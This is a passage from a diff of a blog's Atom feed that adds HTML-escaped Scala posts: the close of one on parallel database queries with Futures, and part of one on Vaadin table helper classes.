+ &lt;span class="n"&gt;groupService&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;GroupService&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+ &lt;span class="n"&gt;executorService&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;ExecutorService&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;executorService._&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;take&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Snapshot&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;usersFuture&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="n"&gt;schedule&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;userService&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
+    &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;groupsFuture&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="n"&gt;schedule&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="n"&gt;groupService&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
+    &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+      &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+        &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;usersFuture&lt;/span&gt;
+        &lt;span class="n"&gt;groups&lt;/span&gt; &lt;span class="k"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;groupsFuture&lt;/span&gt;
+      &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="nc"&gt;Snapshot&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+  &lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id="conclusion"&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href="http://www.scala-lang.org/api/current/index.html#scala.concurrent.Future"&gt;Scala
+Future&lt;/a&gt;s
+provide a powerful abstraction to run certain tasks in parallel using a thread
+pool in the back of the scenes. At the beginning I was afraid that it might
+necessitate too much boilerplate just to get a simple thing done, but luckily
+it turned out to be a quite easy task.&lt;/p&gt;
+
+&lt;p&gt;In this example, I needed to trade off the transactional consistency of
+fetched collections for the sake of increasing performance using multiple
+threads to query the database. While this implied a negligible error margin
+for the particular problem at hand here, it is not something desirable at
+every microservice. But that is the discussion of another blog post.&lt;/p&gt;
+</content>
+  </entry>
   <entry>
     <id>tag:vy.github.io,2015-08-15://blog/post/2015/08/15/vaadin-scala-shortcuts/</id>
     <title type="html">Scala Shortcuts for Vaadin Development</title>
@@ -235,6 +441,174 @@ combo box as follows:&lt;/p&gt;
     &lt;span class="s"&gt;"outputMultiValue"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
     &lt;span class="s"&gt;"Output Multi-Value"&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
     &lt;span class="n"&gt;nullSelectionAllowed&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id="tables"&gt;Tables&lt;/h1&gt;
+
+&lt;p&gt;When I first started working with tables in Vaadin, I – as probably everybody
+else in this business – felt the urge to abstract away the repetitive
+patterns while creating a table. And I came up with the following
+&lt;code&gt;CustomTableHeader&lt;/code&gt; and &lt;code&gt;TableHelpers&lt;/code&gt; utility classes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class="language-scala"&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.lang.&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="nc"&gt;Boolean&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nc"&gt;JBoolean&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.lang.&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="nc"&gt;Long&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nc"&gt;JLong&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.Locale&lt;/span&gt;
+
+&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.bol.vaadin.common.ui.StringToLongConverter&lt;/span&gt;
+&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.vaadin.data.util.converter.&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="nc"&gt;Converter&lt;/span&gt; &lt;span class="k"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nc"&gt;VConverter&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.vaadin.data.util.converter.StringToIntegerConverter&lt;/span&gt;
+&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.vaadin.ui.Table&lt;/span&gt;
+&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;com.vaadin.ui.Table.Align&lt;/span&gt;
+
+&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+ &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt;
+ &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Set&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;CustomTableHeader.Configuration&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;toString&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;
+
+&lt;span class="o"&gt;}&lt;/span&gt;
+
+&lt;span class="k"&gt;object&lt;/span&gt; &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;
+  &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
+   &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Class&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt;
+   &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;CustomTableHeader.Configuration*&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;CustomTableHeader&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+    &lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;clazz&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;toSet&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+  &lt;span class="k"&gt;sealed&lt;/span&gt; &lt;span class="k"&gt;trait&lt;/span&gt; &lt;span class="nc"&gt;Configuration&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Table&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;AnyRef&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt;
+
+  &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;object&lt;/span&gt; &lt;span class="nc"&gt;Configuration&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ExpandRatio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;expandRatio&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Float&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="k"&gt;extends&lt;/span&gt; &lt;span class="nc"&gt;Configuration&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+      &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Table&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;AnyRef&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setColumnExpandRatio&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;expandRatio&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Alignment&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;alignment&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Align&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="k"&gt;extends&lt;/span&gt; &lt;span class="nc"&gt;Configuration&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+      &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Table&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;AnyRef&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setColumnAlignment&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;alignment&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Converter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;converter&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;VConverter&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;, &lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt; &lt;span class="k"&gt;extends&lt;/span&gt; &lt;span class="nc"&gt;Configuration&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+      &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Table&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;AnyRef&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setConverter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;converter&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Collapsed&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;collapsed&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Boolean&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="k"&gt;extends&lt;/span&gt; &lt;span class="nc"&gt;Configuration&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+      &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Table&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;AnyRef&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Unit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isColumnCollapsingAllowed&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+          &lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setColumnCollapsed&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;propertyId&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;collapsed&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="k"&gt;lazy&lt;/span&gt; &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;longToStringConverter&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt;
+    &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nc"&gt;StringToLongConverter&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+      &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;convertToPresentation&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;JLong&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;locale&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Locale&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="nc"&gt;Option&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="n"&gt;orNull&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="k"&gt;lazy&lt;/span&gt; &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;intToStringConvert&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt;
+    &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nc"&gt;StringToIntegerConverter&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+      &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;convertToPresentation&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;locale&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Locale&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+        &lt;span class="nc"&gt;Option&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="n"&gt;map&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="n"&gt;orNull&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+  &lt;span class="k"&gt;sealed&lt;/span&gt; &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Builder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Seq&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Builder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Builder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;:+&lt;/span&gt; &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;addBoolean&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;CustomTableHeader.Configuration*&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Builder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
+      &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;classOf&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;JBoolean&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="kt"&gt;*&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;addInt&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;CustomTableHeader.Configuration*&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Builder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+      &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;extendedConfigurations&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt; &lt;span class="o"&gt;:+&lt;/span&gt;
+        &lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Alignment&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Align&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;RIGHT&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;:+&lt;/span&gt;
+        &lt;span class="nc"&gt;Configuration&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;Converter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;intToStringConvert&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+      &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;CustomTableHeader&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;classOf&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt; &lt;span class="n"&gt;extendedConfigurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="k"&gt;_&lt;/span&gt;&lt;span class="kt"&gt;*&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
+    &lt;span class="o"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;addLong&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;CustomTableHeader.Configuration*&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;:&lt;/span&gt; &lt;span class="kt"&gt;Builder&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
+      &lt;span class="k"&gt;val&lt;/span&gt; &lt;span class="n"&gt;extendedConfigurations&lt;/span&gt; &lt;span class="k"&gt;=&lt;/span&gt; &lt;span class="n"&gt;configurations&lt;/span&gt; &lt;span class="o"&gt;:+&lt;/span&gt;
